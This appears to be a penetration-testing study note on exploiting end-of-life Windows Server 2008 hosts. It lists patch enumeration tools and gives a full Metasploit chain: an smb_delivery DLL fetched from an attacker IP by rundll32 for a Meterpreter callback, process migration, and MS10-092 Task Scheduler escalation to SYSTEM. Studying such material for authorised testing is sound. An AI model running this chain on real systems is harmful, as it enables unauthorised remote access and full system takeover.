# Windows Server

## Key Idea
- Server 2008/2008 R2 went end-of-life 2020-01-14. Rare on external tests, common on internal ones.
- Legacy hosts = old patch level → missing KBs → kernel/LPE exploits. **Why it matters**: medical/university/gov environments run mission-critical software (e.g., MRI) the vendor dropped support for → can't just remove them, consider mitigating controls (network segmentation, extended support).
- Newer servers (2012 R2+) add: Credential Guard, Remote Credential Guard, Device Guard, AppLocker, ATP, Control Flow Guard.

## Enumerating Missing Patches
```cmd
wmic qfe
```
- Lists installed hotfixes (HotFixID, InstalledOn). Google the newest KB to gauge how out-of-date the host is.

**Option A: Sherlock** (PowerShell script, checks for known local priv-esc vulns)
```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```
- Output per CVE: MSBulletin, CVEID, exploit-db link, `VulnStatus` (Appears Vulnerable / Not Vulnerable / Not supported on 64-bit).

**Option B: Windows-Exploit-Suggester**
- Feed it `systeminfo` output; it compares patch level against the MS vulnerability database and suggests Metasploit modules for missing patches.
```bash
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
```

## Obtaining a Meterpreter Shell — smb_delivery
```bash
msfconsole
use exploit/windows/smb/smb_delivery
set target 0          # 0 = DLL, 1 = PSH
set SRVHOST tun0
set LHOST tun0
set LPORT 4444
exploit
```
- Server hosts a DLL over SMB. **Run this on the target**:
```cmd
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```
- Get callback → `Meterpreter session 1 opened`.

## Migrate to a 64-bit Process (WHY)
- The `ms10_092_schelevator` module only works from a 64-bit process. Our DLL shell is x86 (`rundll32.exe` in SysWOW64).
- Either use an x64 Meterpreter payload at delivery time, or migrate first:
```bash
meterpreter > getpid
meterpreter > ps            # find an x64 process we own, e.g. taskhost.exe / cmd.exe / conhost.exe
meterpreter > migrate 2796  # e.g. conhost.exe (x64)
meterpreter > background
```

## Escalating — MS10-092 Task Scheduler .XML (schelevator)
- Exploits Task Scheduler XML parsing: craft a task that runs as SYSTEM (bypasses the "run only as logged-on user" check in older Windows).
```bash
search 2010-3338
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST 10.10.14.3
set LPORT 4443
exploit
```
- Auto-flow: drops payload to `C:\Windows\TEMP`, creates+modifies the task XML, runs + deletes it → new callback.
- Verify SYSTEM:
```bash
meterpreter > getuid      # NT AUTHORITY\SYSTEM
meterpreter > sysinfo
```
